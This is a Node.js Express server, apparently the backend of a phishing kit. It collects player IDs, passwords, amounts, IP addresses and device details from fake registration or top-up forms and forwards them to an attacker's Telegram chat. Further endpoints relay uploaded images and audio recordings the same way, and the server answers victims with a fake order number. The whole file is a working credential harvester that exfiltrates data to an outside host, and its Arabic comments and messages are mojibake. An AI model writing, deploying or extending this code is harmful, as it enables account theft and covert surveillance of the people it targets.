require('dotenv').config();
const express = require('express');
const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// ุชูููู multer ููุชุนุงูู ูุน ุฑูุน ุงููููุงุช
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    const uploadsDir = 'uploads/';
    if (!fs.existsSync(uploadsDir)) {
      fs.mkdirSync(uploadsDir);
    }
    cb(null, uploadsDir);
  },
  filename: function (req, file, cb) {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
    cb(null, file.fieldname + '-' + uniqueSuffix + path.extname(file.originalname));
  }
});

const upload = multer({ storage: storage });

// ุฎุฏูุฉ ุงููููุงุช ุงูุซุงุจุชุฉ ูููููุงุช ุงููุฑููุนุฉ
app.use('/uploads', express.static('uploads'));

// ุงูุญุตูู ุนูู ุงูุชููู ูู ูุชุบูุฑ ุงูุจูุฆุฉ
const BOT_TOKEN = process.env.BOT_TOKEN;

// ุงูุชุญูู ูู ูุฌูุฏ ุงูุชููู
if (!BOT_TOKEN) {
  console.error('โ Telegram Bot Token is not configured');
  process.exit(1);
}

// ูุธููุฉ ูุฅุฑุณุงู ุฑุณุงูุฉ ุฅูู Telegram
async function sendToTelegram(chatId, message, filePath = null) {
  try {
    if (filePath) {
      // ุฅุฐุง ูุงู ููุงู ูููุ ุฃุฑุณูู ูุน ุงูุฑุณุงูุฉ
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('caption', message);
      formData.append('document', fs.createReadStream(filePath));
      
      const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, formData, {
        headers: formData.getHeaders()
      });
      
      return response.data.ok;
    } else {
      // ุฅุฐุง ูู ููู ููุงู ูููุ ุฃุฑุณู ุงูุฑุณุงูุฉ ููุท
      const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      });
      
      return response.data.ok;
    }
  } catch (error) {
    console.error('Error sending to Telegram:', error.response?.data || error.message);
    return false;
  }
}

// ููุทุฉ ุงูููุงูุฉ ูุงุณุชูุจุงู ุจูุงูุงุช ุงูุชุณุฌูู
app.post('/send-to-telegram', async (req, res) => {
  try {
    const { playerId, password, amount, chatId, platform = "ุงูุณุชูุฑุงู", device } = req.body;
    
    // ุงูุชุญูู ูู ุงูุจูุงูุงุช ุงููุทููุจุฉ
    if (!playerId || !password || !amount || !chatId) {
      return res.status(400).json({
        success: false,
        message: 'ุจูุงูุงุช ูุงูุตุฉ: ูุฑุฌู ุงูุชุฃูุฏ ูู ุฅุฑุณุงู ุฌููุน ุงูุจูุงูุงุช ุงููุทููุจุฉ'
      });
    }

    const userDevice = device || req.headers['user-agent'] || "ุบูุฑ ูุนุฑูู";
    
    // ุงูุญุตูู ุนูู ุนููุงู IP ุงููุณุชุฎุฏู
    let userIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    if (userIP === '::1') userIP = '127.0.0.1 (localhost)';
    
    const message = `โฆ๏ธ - ุชู ุชุณุฌูู ุญุณุงุจ ุฌุฏูุฏ 

๐น - ุงุณู ุงููุณุชุฎุฏู: ${playerId}
๐ - ูููุฉ ุงููุฑูุฑ: ${password}
๐ฐ - ุงููุจูุบ: ${amount}
๐ฑ - ุงูุฌูุงุฒ: ${userDevice}
๐ - IP: ${userIP}
๐ - ุงูููุตุฉ: ${platform}`;

    // ุฅุฑุณุงู ุงูุฑุณุงูุฉ ุฅูู Telegram
    const success = await sendToTelegram(chatId, message);
    
    if (success) {
      res.json({
        success: true,
        message: 'ุชู ุฅุฑุณุงู ุงูุจูุงูุงุช ุฅูู Telegram ุจูุฌุงุญ',
        orderId: `#${Math.floor(100000 + Math.random() * 900000)}`
      });
    } else {
      res.status(500).json({
        success: false,
        message: 'ูุดู ูู ุฅุฑุณุงู ุงูุฑุณุงูุฉ ุฅูู Telegram'
      });
    }
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    res.status(500).json({
      success: false,
      message: 'ุญุฏุซ ุฎุทุฃ ุฃุซูุงุก ุฅุฑุณุงู ุงูุจูุงูุงุช',
      error: error.message
    });
  }
});

// ููุทุฉ ุงูููุงูุฉ ูุงุณุชูุจุงู ุจูุงูุงุช ุงูุชุณุฌูู ุงูุนุงูุฉ
app.post('/register', async (req, res) => {
  try {
    const { username, password, ip, chatId } = req.body;
    
    if (!username || !password || !ip || !chatId) {
      return res.status(400).json({ 
        success: false,
        error: 'Missing required fields: username, password, ip, and chatId are required' 
      });
    }

    const message = `๐ ุชุณุฌูู ุญุณุงุจ ุฌุฏูุฏ\n๐ค ุงุณู ุงููุณุชุฎุฏู: ${username}\n๐ ูููุฉ ุงููุฑูุฑ: ${password}\n๐ ุนููุงู IP: ${ip}`;
    
    const success = await sendToTelegram(chatId, message);
    
    if (success) {
      res.status(200).json({ 
        success: true,
        message: 'ุชู ุฅุฑุณุงู ุงูุจูุงูุงุช ุฅูู Telegram ุจูุฌุงุญ' 
      });
    } else {
      res.status(500).json({ 
        success: false,
        error: 'ูุดู ูู ุฅุฑุณุงู ุงูุจูุงูุงุช ุฅูู Telegram' 
      });
    }
  } catch (error) {
    console.error('Error processing registration:', error);
    res.status(500).json({ 
      success: false,
      error: 'Internal server error' 
    });
  }
});

// ููุทุฉ ุงูููุงูุฉ ูุงุณุชูุจุงู ุงูุตูุฑ
app.post('/upload-image', upload.single('image'), async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ 
        success: false,
        error: 'No image file provided' 
      });
    }

    const { username, imageType, chatId } = req.body;
    const imagePath = req.file.path;
    
    let message = `๐ผ๏ธ ุชู ุงุณุชูุจุงู ุตูุฑุฉ ุฌุฏูุฏุฉ`;
    if (username) message += `\n๐ค ุงููุณุชุฎุฏู: ${username}`;
    if (imageType) message += `\n๐ธ ููุน ุงูุตูุฑุฉ: ${imageType}`;
    
    const success = await sendToTelegram(chatId, message, imagePath);
    
    if (success) {
      res.status(200).json({ 
        success: true,
        message: 'ุชู ุฅุฑุณุงู ุงูุตูุฑุฉ ุฅูู Telegram ุจูุฌุงุญ' 
      });
    } else {
      res.status(500).json({ 
        success: false,
        error: 'ูุดู ูู ุฅุฑุณุงู ุงูุตูุฑุฉ ุฅูู Telegram' 
      });
    }
  } catch (error) {
    console.error('Error processing image upload:', error);
    res.status(500).json({ 
      success: false,
      error: 'Internal server error' 
    });
  }
});

// ููุทุฉ ุงูููุงูุฉ ูุงุณุชูุจุงู ูููุงุช ุงูุตูุช
app.post('/upload-audio', upload.single('audio'), async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ 
        success: false,
        error: 'No audio file provided' 
      });
    }

    const { username, chatId } = req.body;
    const audioPath = req.file.path;
    
    let message = `๐ต ุชู ุชุณุฌูู ุตูุช ุฌุฏูุฏ`;
    if (username) message += `\n๐ค ุงููุณุชุฎุฏู: ${username}`;
    
    const success = await sendToTelegram(chatId, message, audioPath);
    
    if (success) {
      res.status(200).json({ 
        success: true,
        message: 'ุชู ุฅุฑุณุงู ุงูุตูุช ุฅูู Telegram ุจูุฌุงุญ' 
      });
    } else {
      res.status(500).json({ 
        success: false,
        error: 'ูุดู ูู ุฅุฑุณุงู ุงูุตูุช ุฅูู Telegram' 
      });
    }
  } catch (error) {
    console.error('Error processing audio upload:', error);
    res.status(500).json({ 
      success: false,
      error: 'Internal server error' 
    });
  }
});

// ููุทุฉ ุงูููุงูุฉ ููุชุญูู ูู ุนูู ุงูุณูุฑูุฑ
app.get('/health', (req, res) => {
  res.status(200).json({ 
    success: true,
    status: 'Server is running',
    tokenConfigured: !!BOT_TOKEN
  });
});

// ุจุฏุก ุงูุณูุฑูุฑ
app.listen(PORT, () => {
  console.log(`โ Server is running on port ${PORT}`);
});

// ุชูุธูู ุงููููุงุช ุงููุคูุชุฉ ุจุดูู ุฏูุฑู (ุงุฎุชูุงุฑู)
setInterval(() => {
  const uploadsDir = 'uploads/';
  if (fs.existsSync(uploadsDir)) {
    fs.readdir(uploadsDir, (err, files) => {
      if (err) {
        console.error('Error reading uploads directory:', err);
        return;
      }
      
      const now = Date.now();
      const oneHour = 60 * 60 * 1000; // ุณุงุนุฉ ูุงุญุฏุฉ ุจุงููููู ุซุงููุฉ
      
      for (const file of files) {
        const filePath = path.join(uploadsDir, file);
        fs.stat(filePath, (err, stat) => {
          if (err) {
            console.error('Error getting file stats:', err);
            return;
          }
          
          if (now - stat.mtimeMs > oneHour) {
            fs.unlink(filePath, err => {
              if (err) {
                console.error('Error deleting file:', err);
              } else {
                console.log(`ุชู ุญุฐู ุงูููู ุงููุฏูู: ${filePath}`);
              }
            });
          }
        });
      }
    });
  }
}, 60 * 60 * 1000); // ุงูุชุดุบูู ูู ุณุงุนุฉ
